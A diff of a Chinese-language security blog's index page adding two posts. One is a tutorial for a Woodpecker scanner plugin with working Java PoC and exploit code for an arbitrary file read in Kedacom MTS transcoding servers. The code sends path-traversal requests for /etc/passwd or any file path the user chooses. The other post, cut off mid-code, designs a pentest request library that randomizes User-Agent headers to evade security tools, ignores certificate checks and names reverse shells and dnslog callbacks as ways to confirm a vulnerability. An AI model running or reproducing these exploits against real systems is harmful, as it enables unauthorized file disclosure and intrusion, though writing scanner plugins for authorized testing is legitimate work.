@@ -143,6 +143,349 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-woodpecker" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/04/17/woodpecker/">woodpecker</a>
+    </h1>
+  
+
+        
+        <a href="/2023/04/17/woodpecker/" class="archive-article-date">
+  	<time datetime="2023-04-17T05:27:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-04-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Woodpecker插件编写"><a href="#Woodpecker插件编写" class="headerlink" title="Woodpecker插件编写"></a>Woodpecker插件编写</h2><h3 id="框架规范与编写"><a href="#框架规范与编写" class="headerlink" title="框架规范与编写"></a>框架规范与编写</h3><ol>
+<li><p>创建项目</p>
+<p>生成器选择Meven</p>
+<p>项目名：漏洞名-vuldb</p>
+<p>archetype：maven-archetype-quickstart</p>
+<p>高级设置内的groupID改为：me.gv7.woodpecker.plugin</p>
+</li>
+<li><p>woodpecker框架加载插件时入口寻找WoodpeckerPluginManager这样的类名</p>
+<p><code>WoodpeckerPluginManager</code>实现<code>IPluginManager</code>接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WoodpeckerPluginManager</span> <span class="keyword">implements</span> <span class="title class_">IPluginManager</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerPluginManagerCallbacks</span><span class="params">(IPluginManagerCallbacks iPluginManagerCallbacks)</span> &#123;</span><br><span class="line">        iPluginManagerCallbacks.registerVulPlugin(<span class="keyword">new</span> <span class="title class_">KedacomMTSVulPlugin</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>在registerPluginManagerCallbacks方法中告诉woodpecker我们的插件在哪个类中</p>
+</li>
+<li><p>自定义类要实现<code>IVulPlugin</code>接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KedacomMTSVulPlugin</span> <span class="keyword">implements</span> <span class="title class_">IVulPlugin</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IVulPluginCallbacks callbacks;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IPluginHelper pluginHelper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">VulPluginMain</span><span class="params">(IVulPluginCallbacks callbacks)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.callbacks = callbacks;</span><br><span class="line">        <span class="built_in">this</span>.pluginHelper = callbacks.getPluginHelper();</span><br><span class="line">        <span class="comment">//设置插件名称</span></span><br><span class="line">        callbacks.setVulPluginName(<span class="string">&quot;KedacomMTS Any File Read&quot;</span>);</span><br><span class="line">        <span class="comment">//插件版本</span></span><br><span class="line">        callbacks.setVulPluginVersion(<span class="string">&quot;1.0.0&quot;</span>);</span><br><span class="line">        <span class="comment">//插件作者</span></span><br><span class="line">        callbacks.setVulPluginAuthor(<span class="string">&quot;ruia&quot;</span>);</span><br><span class="line">        <span class="comment">//漏洞编号1-10，漏洞官方给定分值</span></span><br><span class="line">        callbacks.setVulCVSS(<span class="number">7.5</span>);</span><br><span class="line">        <span class="comment">//漏洞名称</span></span><br><span class="line">        callbacks.setVulName(<span class="string">&quot;科达 MTS转码服务器 任意文件读取&quot;</span>);</span><br><span class="line">        <span class="comment">//插件介绍</span></span><br><span class="line">        callbacks.setVulDescription(<span class="string">&quot;不经允许的情况下进行服务器的任意文件读取&quot;</span>);</span><br><span class="line">        <span class="comment">//漏洞等级</span></span><br><span class="line">        callbacks.setVulSeverity(<span class="string">&quot;normal&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//漏洞验证模块注册，POC模块只能有一个选择</span></span><br><span class="line">        callbacks.registerPoc(<span class="keyword">new</span> <span class="title class_">KedacomMTSVerify</span>());</span><br><span class="line">        <span class="comment">//漏洞利用模块注册，利用方式可以写多种</span></span><br><span class="line">        List&lt;IExploit&gt; exploitList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;IExploit&gt;();</span><br><span class="line">        exploitList.add(<span class="keyword">new</span> <span class="title class_">KedacomMTSUse</span>());</span><br><span class="line">        <span class="comment">//exploitList.add();</span></span><br><span class="line">        callbacks.registerExploit(exploitList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在自定义的类中我们使用callbacks.registerPoc()和callbacks.registerExploit()注册POC模块和Exploit模块</p>
+</li>
+<li><p>plugin包下创建pocs包，pocs包内创建我们自定义的poc类，POC模块只能有一个，需要实现IPoc接口</p>
+</li>
+<li><p>在poc类中另外创建一个方法写验证方法，继承的doVerify方法只需要调用我们的方法拿到结果输出就行了，返回值内容需要包含：Boolean类型的true或false表示是否存在漏洞，以及String类型的返回内容。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KedacomMTSVerify</span> <span class="keyword">implements</span> <span class="title class_">IPoc</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ITarget左边我们输入目标地址的输入框</span></span><br><span class="line">    <span class="comment">//IScanResult右边poc结果显示的输入框</span></span><br><span class="line">    <span class="comment">//IResultOutput右下运行状态的输入框</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IScanResult <span class="title function_">doVerify</span><span class="params">(ITarget iTarget, IResultOutput iResultOutput)</span>&#123;</span><br><span class="line">        <span class="comment">//拿到框架的输出框</span></span><br><span class="line">        <span class="type">IScanResult</span> <span class="variable">scanResult</span> <span class="operator">=</span> KedacomMTSVulPlugin.pluginHelper.createScanResult();</span><br><span class="line">        <span class="comment">//输出框中的Target信息</span></span><br><span class="line">        scanResult.setTarget(iTarget.getAddress());</span><br><span class="line">        <span class="comment">//调用自己的验证方法,目标从ITargent中获取</span></span><br><span class="line">        Map&lt;String, Object&gt; responseMap = checkGetFile(iTarget.getAddress());</span><br><span class="line">        <span class="comment">//输出框中的Result信息，Boolean类型</span></span><br><span class="line">        scanResult.setExists((Boolean) responseMap.get(<span class="string">&quot;flag&quot;</span>));</span><br><span class="line">        <span class="comment">//输框中的info信息，String类型</span></span><br><span class="line">        scanResult.setMsg((String) responseMap.get(<span class="string">&quot;results&quot;</span>));</span><br><span class="line">        <span class="comment">//右下输出框的内容输出</span></span><br><span class="line">        iResultOutput.infoPrintln((String) responseMap.get(<span class="string">&quot;results&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> scanResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//自定义漏洞验证方法checkGetFile</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Object&gt; <span class="title function_">checkGetFile</span><span class="params">(String address)</span>&#123;</span><br><span class="line">        Map&lt;String,Object&gt; responseMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RawResponse</span> <span class="variable">response</span> <span class="operator">=</span> Requests.get(address+<span class="string">&quot;/../../../../../../etc/passwd&quot;</span>).verify(<span class="literal">false</span>).timeout(<span class="number">5000</span>).send();</span><br><span class="line">            <span class="type">String</span> <span class="variable">responseBody</span> <span class="operator">=</span> ToString.scannerOutString(<span class="keyword">new</span> <span class="title class_">Scanner</span>(response.body()));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (response.statusCode() == <span class="number">200</span>&amp;&amp;responseBody.contains(<span class="string">&quot;root&quot;</span>)&amp;&amp;responseBody.contains(<span class="string">&quot;/bin/bash&quot;</span>))&#123;</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">                result = String.format(<span class="string">&quot;%s存在任意文件读取漏洞！&quot;</span>,address);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                result = String.format(<span class="string">&quot;%s不存在任意文件读取漏洞。&quot;</span>,address);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">            result = String.format(<span class="string">&quot;%s不存在任意文件读取漏洞。&quot;</span>,address);</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            responseMap.put(<span class="string">&quot;flag&quot;</span>,flag);</span><br><span class="line">            responseMap.put(<span class="string">&quot;results&quot;</span>,result);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> responseMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>plugin包下创建exploit包，exploit包内创建我们自定义的类，漏洞利用模块可以有多个，需要实现IExploit接口</p>
+</li>
+<li><p>IExploit接口有三个要实现的方法：</p>
+<ul>
+<li><p>getExploitTabCaption：模块的名字</p>
+</li>
+<li><p>getExploitCustomArgs：参数定义，可以有多个参数</p>
+</li>
+<li><p>doExploit：利用，代码实现</p>
+</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KedacomMTSUse</span> <span class="keyword">implements</span> <span class="title class_">IExploit</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//利用模块的名称</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getExploitTabCaption</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Read File&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//参数定义</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IArgsUsageBinder <span class="title function_">getExploitCustomArgs</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//拿到框架的输入框</span></span><br><span class="line">        <span class="type">IArgsUsageBinder</span> <span class="variable">argsUsageBinder</span> <span class="operator">=</span> KedacomMTSVulPlugin.pluginHelper.createArgsUsageBinder();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//参数全都存放到args中，可能不止一个参数</span></span><br><span class="line">        List&lt;IArg&gt; args = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//定义第一个参数filePath</span></span><br><span class="line">        <span class="type">IArg</span> <span class="variable">filePath</span> <span class="operator">=</span> KedacomMTSVulPlugin.pluginHelper.createArg();</span><br><span class="line">        <span class="comment">//设置参数属性</span></span><br><span class="line">        filePath.setDescription(<span class="string">&quot;任意文件读取的地址&quot;</span>);    <span class="comment">//参数的介绍</span></span><br><span class="line">        filePath.setRequired(<span class="literal">true</span>);     <span class="comment">//设为必填项</span></span><br><span class="line">        filePath.setDefaultValue(<span class="string">&quot;/etc/passwd&quot;</span>);    <span class="comment">//参数的默认值</span></span><br><span class="line">        filePath.setName(<span class="string">&quot;filePath&quot;</span>);   <span class="comment">//参数名，给用户看的</span></span><br><span class="line">        <span class="comment">//添加参数</span></span><br><span class="line">        args.add(filePath);</span><br><span class="line">        <span class="comment">//将参数列表添加进输入框中</span></span><br><span class="line">        argsUsageBinder.setArgsList(args);</span><br><span class="line">        <span class="keyword">return</span> argsUsageBinder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//漏洞利用</span></span><br><span class="line">    <span class="comment">//iTarget代表目标地址栏</span></span><br><span class="line">    <span class="comment">//map代表上面定义的参数列表内容</span></span><br><span class="line">    <span class="comment">//iResultOutput代表响应结果输出框</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doExploit</span><span class="params">(ITarget iTarget, Map&lt;String, Object&gt; map, IResultOutput iResultOutput)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//拿到参数内容</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> (String) map.get(<span class="string">&quot;filePath&quot;</span>);</span><br><span class="line">            <span class="comment">//目标地址</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">address</span> <span class="operator">=</span> iTarget.getAddress();</span><br><span class="line"></span><br><span class="line">            <span class="type">RawResponse</span> <span class="variable">response</span> <span class="operator">=</span> Requests.get(address+<span class="string">&quot;/../../../../../../../..&quot;</span>+filePath).verify(<span class="literal">false</span>).timeout(<span class="number">5000</span>).send();</span><br><span class="line">            <span class="type">String</span> <span class="variable">responseBody</span> <span class="operator">=</span> ToString.scannerOutString(<span class="keyword">new</span> <span class="title class_">Scanner</span>(response.body()));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (response.statusCode() == <span class="number">200</span>) &#123;</span><br><span class="line">                iResultOutput.successPrintln(responseBody);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                iResultOutput.failPrintln(responseBody);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            iResultOutput.failPrintln(<span class="string">&quot;读取失败。&quot;</span>+e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><ol>
+<li>poc模块和exploit模块地址需要带协议，不带协议的地址会报错</li>
+<li>手动在代码中添加协议也不行</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/04/17/woodpecker/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Java-Request" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/04/17/Java-Request/">Java_Request</a>
+    </h1>
+  
+
+        
+        <a href="/2023/04/17/Java-Request/" class="archive-article-date">
+  	<time datetime="2023-04-17T05:26:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-04-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="java网络请求框架"><a href="#java网络请求框架" class="headerlink" title="java网络请求框架"></a>java网络请求框架</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>渗透过程中我们通常是通过网络请求与响应结果来达成我们的目的。</p>
+<p>判断漏洞存在的几种方式：</p>
+<ol>
+<li>执行命令，判断返回值</li>
+<li>使目标ping第三方dns平台，如dnslog、ceye;拿到想要的结果</li>
+<li>执行命令，判断网页回显内容</li>
+<li>创建文件，访问文件地址</li>
+<li>手动延时，这种方式对目标系统有危害，准确性也存在疑问</li>
+<li>反弹shell，没有回显，拿到shell就有，没拿到就没有或存在限制</li>
+</ol>
+<p>通常情况下使用123，极端情况下使用456</p>
+<p><strong>poc的本质</strong>：向目标传输payload，目标返回执行结果。如果结果符合预期就存在漏洞。</p>
+<p>payload+网络请求IO+本地IO就是我们的验证过程</p>
+<p>不同的漏洞有不同的payload，所以我们的需求就是如何编写一个健壮的网络请求框架。</p>
+<h3 id="需求剖析"><a href="#需求剖析" class="headerlink" title="需求剖析"></a>需求剖析</h3><p><strong>核心需求</strong>：发送网络请求拿到返回响应</p>
+<p><strong>功能点</strong>：</p>
+<ol>
+<li>随机UA头，工具成熟之后安全工具可能根据UA头进行检查拦截</li>
+<li>忽略证书安全性，Http和Https的请求</li>
+<li>协议的判断，在用户没有输入协议的情况下根据tls连接添加协议头</li>
+<li>判断两种默认的请求头是否自定义，如果没有就使用默认的；Content-type和User-agent</li>
+<li>切记设置请求的连接超时时间和读取超时时间，防止特殊情况拖死我们的请求</li>
+<li>注意自定义请求头，将用户自定义的请求头进行添加。有些验证或攻击手法需要对请求头做文章</li>
+<li>获取返回结果的请求头，有些poc需要判断返回结果的请求头</li>
+</ol>
+<p><strong>扩展需求</strong>：本地IO的编写</p>
+<ol>
+<li>批量验证网页请求</li>
+<li>返回包的判断</li>
+<li>对接第三方平台</li>
+</ol>
+<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><ol>
+<li><p>RequestTemplate请求框架类，实现多个请求方法</p>
+</li>
+<li><p><strong>getBody方法，无参GET方式请求</strong>，返回值包含：状态码、响应头、响应正文。</p>
+</li>
+<li><p>因为java返回值只能有一个，所以用Map存放所有内容返回；</p>
+</li>
+<li><p>方法的参数有三个：用户自定义请求头、目标地址、超时时间</p>
+</li>
+<li><p><strong>正文第一步：判断用户传入的地址是否带有请求头，如果没有则我们手动添加</strong></p>
+</li>
+<li><p>假设目标网址使用https协议，进行连接测试。使用try{}catch(){}进行包裹；</p>
+</li>
+<li><p>如果目标实际使用的是http协议则连接会出现异常，而使用https则什么都不会做仅连接测试。</p>
+</li>
+<li><p>使用标识位isHTTPS来记录网站是否使用Https。最后根据标志位手动给网站添加协议</p>
+</li>
+<li><p><strong>第二步：连接</strong>，根据协议头区分使用HttpsURLConnection还是HttpURLConnection</p>
+</li>
+<li><p>HttpsURLConnection是HttpURLConnection的子类继承于它；https需要忽略证书安全性，而http不需要</p>
+</li>
+<li><p>如果用户没有指定User-agent头我们就随机分配一个User-agent头</p>
+</li>
+<li><p>如果用户没有指定Content-type头我们就默认设置”application&#x2F;x-www-form-urlencodeed;charset&#x3D;UTF-8”</p>
+</li>
+<li><p>再将用户传入的自定义请求头添加进网站请求头中，最后进行连接</p>
+</li>
+<li><p><strong>第三步：获取响应结果</strong>，通过getResponseCode和getHeaderFields拿到状态码和响应头</p>
+</li>
+<li><p>响应正文需要先获取对象的流，从流中读取内容存放到StringBuilder中</p>
+</li>
+<li><p>成功的请求要用getInpuStream方法获取，不成功的用getErrorStream方法获取</p>
+</li>
+<li><p>将获取到的状态码、响应头、响应正文添加到Map字典中返回。</p>
+</li>
+<li><p><strong>GET有参方法</strong>，在用户传入中添加一项String param表示要传递的参数</p>
+</li>
+<li><p>整体基本与无参请求一致，区别在于连接时url &#x3D; uri+”?”+param</p>
+</li>
+<li><p><strong>POST方式</strong>，整体基本也与GET有参相同，但参数需要通过流写出到连接对象中</p>
+</li>
+<li><p>添加connection.setDoOutput(true);代表我们能写对象的流</p>
+</li>
+<li><p>修改连接方式为POST：connection.setRequestMethod(“POST”);</p>
+</li>
+<li><p>getOutputStream方法拿到流对象，使用PrintWrite将参数写出到对象中</p>
+</li>
+<li><p><strong>json的传值方式</strong>，将Content-type头改成”application&#x2F;json;charset&#x3D;UTF-8”就行了</p>
+</li>
+</ol>
+<p>1.使用ceye平台给的API进行调用，返回是否调用成功的结果</p>
+<p>2.可视化建议使用：javafx Scene Builder可以直接进行拖拽模块</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.net.ssl.*;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.security.cert.CertificateException;</span><br><span class="line"><span class="keyword">import</span> java.security.cert.X509Certificate;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">//主要功能点</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1、忽略证书安全性</span></span><br><span class="line"><span class="comment">2、随机UA头</span></span><br><span class="line"><span class="comment">3、协议的判断，在用户没有输入协议的情况下根据tls连接添加协议头</span></span><br><span class="line"><span class="comment">4、判断两种默认的请求头是否自定义，如果没有就使用默认的    Content-type和User-agent</span></span><br><span class="line"><span class="comment">5、切记设置请求的连接超时时间和读取超时时间，防止特殊情况拖死我们的请求</span></span><br><span class="line"><span class="comment">6、注意自定义请求头，将用户自定义的请求头进行添加</span></span><br><span class="line"><span class="comment">7、获取返回的请求头，因为有的poc判断返回结果的请求头</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestTemplate</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//UA头字典</span></span><br><span class="line">    <span class="keyword">static</span> String[] agent = <span 